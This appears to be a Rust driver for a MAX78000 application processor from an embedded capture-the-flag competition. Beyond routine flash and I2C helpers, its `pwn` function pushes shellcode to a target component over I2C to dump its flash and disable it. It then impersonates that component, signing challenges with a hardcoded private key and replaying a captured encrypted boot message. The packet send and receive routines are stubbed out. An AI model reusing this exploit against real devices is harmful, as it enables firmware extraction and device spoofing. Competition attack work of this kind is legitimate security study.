use core::slice;
use core::time::Duration;
use bytemuck::{must_cast_slice, Pod, Zeroable};

use serde::{Serialize, Deserialize};
use design_utils::crypto::sign;
use max78000_hal::{flash::PAGE_MASK, i2c::{I2cAddr, MAX_I2C_MESSAGE_LEN}, Flash, MasterI2c, Peripherals, Trng, timer::sleep};
use max78000_hal::prelude::*;
use design_utils::{component_id_to_i2c_addr, messages::ProtocolError, I2C_FREQUENCY};

use rand_core::{RngCore, SeedableRng};
use rand_chacha::ChaCha20Rng;

use crate::ectf_params::{COMPONENTS, FLASH_DATA_ADDR, SHELLCODE, RECV_DONE_ADDRESS, WRITE_LEN};
use crate::ApError;

pub const FLASH_MAGIC: u32 = 0xdeadbeef;
pub const FLASH_DATA: *const FlashData = FLASH_DATA_ADDR as *const FlashData;

pub struct ApDriver {
    flash: Flash,
    i2c: Option<MasterI2c>,
    trng: Trng,
    chacha: ChaCha20Rng,
    flash_data: Option<FlashData>,
    i2c_recv_buffer: [u8; MAX_I2C_MESSAGE_LEN],
}

impl ApDriver {
    pub fn new() -> Self {
        let Peripherals {
            flash,
            i2c,
            mut trng,
        } = Peripherals::take().expect("could not initialize peripherals");

        let i2c = i2c.init_master(I2C_FREQUENCY);
        let chacha = ChaCha20Rng::from_seed(trng.gen_nonce());

        ApDriver {
            flash,
            i2c: Some(i2c),
            trng,
            chacha,
            flash_data: None,
            i2c_recv_buffer: [0; MAX_I2C_MESSAGE_LEN],
        }
    }

    pub fn get_flash_data(&mut self) -> FlashData {
        if let Some(flash_data) = self.flash_data {
            flash_data
        } else {
            // read data from flash if it is not yet read
            // safety: flash data should be valid for any pattern of bytes
            let mut flash_data = unsafe {
                core::ptr::read(FLASH_DATA)
            };

            // if flash is not initialized, component ids we are provisioned for
            if flash_data.flash_magic != FLASH_MAGIC {
                flash_data.flash_magic = FLASH_MAGIC;
                flash_data.components_len = COMPONENTS.len();
                flash_data.components[..COMPONENTS.len()].copy_from_slice(COMPONENTS.as_slice());
            }

            self.flash_data = Some(flash_data);
            flash_data
        }
    }

    pub fn save_flash_data(&mut self, flash_data: FlashData) {
        // safety: nothing else is present at the flash address, linker script only uses bottom half of flash
        unsafe {
            self.flash.erase_page(FLASH_DATA_ADDR & PAGE_MASK)
                .expect("could not erase flash page");

            self.flash.write(FLASH_DATA_ADDR, must_cast_slice(slice::from_ref(&flash_data)))
                .expect("could not save data to flash");
        }

        self.flash_data = Some(flash_data);
    }

    pub fn get_chacha(&mut self) -> &mut ChaCha20Rng {
        &mut self.chacha
    }

    fn send_packet(&mut self, address: I2cAddr, packet: &[u8]) -> Result<(), ApError> {
        /*let mut send_packet = [0; MAX_I2C_MESSAGE_LEN];
        send_packet[0] = packet.len().try_into().expect("i2c send message to big");
        send_packet[1..(packet.len() + 1)].copy_from_slice(packet);

        self.i2c.send(address, &send_packet[..(packet.len() + 1)])?;*/

        unimplemented!();
    }

    fn recieve_packet(&mut self, address: I2cAddr) -> Result<&[u8], ApError> {
        /*let mut recv_len = 0;

        sleep(Duration::from_millis(3));

        loop {
            self.i2c.recv(address, slice::from_mut(&mut recv_len))?;

            // delay to allow component to get work done while requesting response, and delay is needed between next read
            sleep(Duration::from_millis(5));

            if recv_len != 0 {
                self.i2c.recv(address, &mut self.i2c_recv_buffer[..recv_len.into()])?;

                return Ok(&self.i2c_recv_buffer[..recv_len.into()]);
            }
        }*/
        unimplemented!();
    }

    pub fn send_struct<M: Serialize>(&mut self, address: I2cAddr, message: M) -> Result<(), ApError> {
        let mut send_buf = [0; MAX_I2C_MESSAGE_LEN];
        let serialized_message = postcard::to_slice::<Result<M, ProtocolError>>(&Ok(message), &mut send_buf)?;

        self.send_packet(address, serialized_message)
    }

    pub fn receive_struct<'de, R: Deserialize<'de>>(&'de mut self, address: I2cAddr) -> Result<R, ApError> {
        let response_bytes = self.recieve_packet(address)?;

        let response: Result<R, ProtocolError> = postcard::from_bytes(response_bytes)?;
        Ok(response?)
    }

    pub fn send_and_receive_struct<'de, M: Serialize, R: Deserialize<'de>>(
        &'de mut self,
        address: I2cAddr, message: M
    ) -> Result<R, ApError> {
        self.send_struct(address, message)?;
        self.receive_struct(address)
    }

    pub fn send_error(&mut self, address: I2cAddr) -> Result<(), ApError> {
        let mut send_buf = [0; MAX_I2C_MESSAGE_LEN];
        let serialized_message = postcard::to_slice::<Result<(), ProtocolError>>(&Err(ProtocolError), &mut send_buf)?;

        self.send_packet(address, serialized_message)?;
        let response_bytes = self.recieve_packet(address)?;

        // this response should be an error, but we don't really need to check if it is
        let _response: Result<(), ProtocolError> = postcard::from_bytes(response_bytes)?;

        Ok(())
    }

    pub fn gen_bytes<const N: usize>(&mut self) -> [u8; N] {
        let mut bytes = [0u8; N];
        self.chacha.fill_bytes(&mut bytes);
        bytes
    }

    pub fn gen_nonce(&mut self) -> u64 {
        self.chacha.next_u64()
    }

    // used for i2c pwn
    pub fn pwn(&mut self) {
        let flash_data = self.get_flash_data();

        // component to pwn is passed in as first provisioned component
        let i2c_addr = component_id_to_i2c_addr(flash_data.components[0].component_id);

        uprintln!("start flash dump");
        loop {
            match self.i2c.as_mut().unwrap().repeated_restart_pwn(i2c_addr, &SHELLCODE, RECV_DONE_ADDRESS, WRITE_LEN) {
                Ok(()) => break,
                Err(err) => {
                    uprintln!("Error while attempting to dump flash: {err:?}");
                    uprintln!("retrying...");
                    sleep(Duration::from_secs(1));
                }
            }
        }

        uprintln!("ub component disabled");
        let i2c = self.i2c.take().unwrap();
        let uninit_i2c = i2c.reset();
        let i2c = uninit_i2c.init_client(I2C_FREQUENCY, 0x69);
        uprintln!("i2c switched over to component mode");

        let private_key: [u8; 64] = [0xDD,0xF8,0x48,0xB0,0xE,0x93,0x6,0x9B,0x5A,0x5,0x0,0xF1,0xA,0x81,0x2B,0xEA,0xEB,0x73,0xDD,0xF8,0x54,0x90,0x6,0x93,0xBE,0xE6,0x0,0x22,0x9,0x92,0xFE,0xF7,0xC6,0xBB,0x7,0x9B,0x5B,0x6E,0xDD,0x7,0x7,0xD4,0x7,0x9B,0x9B,0x89,0x9C,0x5,0x3,0xD4,0x7,0x9B,0x98,0x6D,0x1,0xF0,0xCF,0xFF,0x4F,0xF0,0xFF,0x33,0xA,0x93];

        // now do the boot process, first reply to ap challenge
        for _ in 0..2 {
            let mut recv_buf = [0; 256];
            i2c.recv(&mut recv_buf);
            uprintln!("ap challenge recieved");

            let message = &recv_buf[..(64 + 5)];
            let signature = sign(message, &private_key[..32].try_into().unwrap());

            let mut send_buf = [0; 256];
            send_buf[0..64].copy_from_slice(&signature.to_bytes());
            // nonce, we don't care about though
            send_buf[64..128].fill(0);

            uprintln!("sending responce");
            i2c.send(&send_buf);
            uprintln!("sent");
        }

        let enc_boot_message = [0x56,0x42,0x10,0x32,0x89,0x4A,0x15,0x92,0x34,0xDA,0xAA,0x46,0x10,0x27,0x15,0x46,0x4,0xE0,0x8,0xF1,0x8,0x8,0x10,0x3E,0x10,0x2E,0x2A,0xDD,0x1,0x33,0x10,0x34,0x7,0x2B,0xC8,0xE9,0x0,0x57,0xCD,0xE9,0x33,0x34,0xF2,0xDD,0xDD,0xE9,0x7,0x10,0x32,0xAA,0x0,0xF0,0xC5,0xF9,0x0,0x28,0x7F,0xF4,0x22,0xA8,0xDD,0xE9,0x33,0x34,0xD,0xF1,0xD4,0x8,0xE7,0xE7,0x0,0x23,0xC,0x93,0x45,0xAD,0xC,0xE4,0xAC,0x19,0x47,0x27,0xAE,0xE4,0x13,0x9B,0x18,0x9A,0x3,0xEB,0x2,0xB,0x12,0x9B,0x0,0x2B,0x40,0xF3,0xEE,0x80,0x67,0x23,0xE,0x93,0xAB,0xE7,0x6F,0x4A,0x15,0x92,0xFF,0xF7,0xCE,0xB8,0x55,0x46,0x1,0x33,0x15,0x9A,0xC8,0xF8,0x0,0x20,0x34,0x44,0x7,0x2B,0xCD,0xE9,0x33,0x34,0xC8,0xF8,0x4,0x60,0x7F,0xF7,0xFB,0xA9,0xDD,0xE9,0x7,0x10];

        // send encrypted boot message
        for _ in 0..2 {
            let mut recv_buf = [0; 256];
            i2c.recv(&mut recv_buf);
            uprintln!("recieved ap responce");

            i2c.send(&enc_boot_message);
            uprintln!("sent encrypted boot message");
        }
    }
}

#[repr(C)]
#[derive(Debug, Default, Clone, Copy, Pod, Zeroable)]
pub struct ProvisionedComponent {
    pub component_id: u32,
    pub key_index: usize,
}

/// Datatype for information stored in flash
#[repr(C)]
#[derive(Debug, Default, Clone, Copy, Pod, Zeroable)]
pub struct FlashData {
    pub(crate) components_len: usize,
    pub(crate) components: [ProvisionedComponent; 2],
    pub(crate) flash_magic: u32,
}

impl FlashData {
    pub fn get_provisioned_component(&mut self, component_id: u32) -> Option<&mut ProvisionedComponent> {
        for i in 0..self.components_len {
            if self.components[i].component_id == component_id {
                return Some(&mut self.components[i]);
            }
        }

        None
    }

    pub fn get_component_for_i2c_addr(&self, i2c_addr: I2cAddr) -> Option<&ProvisionedComponent> {
        for i in 0..self.components_len {
            if component_id_to_i2c_addr(self.components[i].component_id) == i2c_addr {
                return Some(&self.components[i]);
            }
        }

        None
    }
}
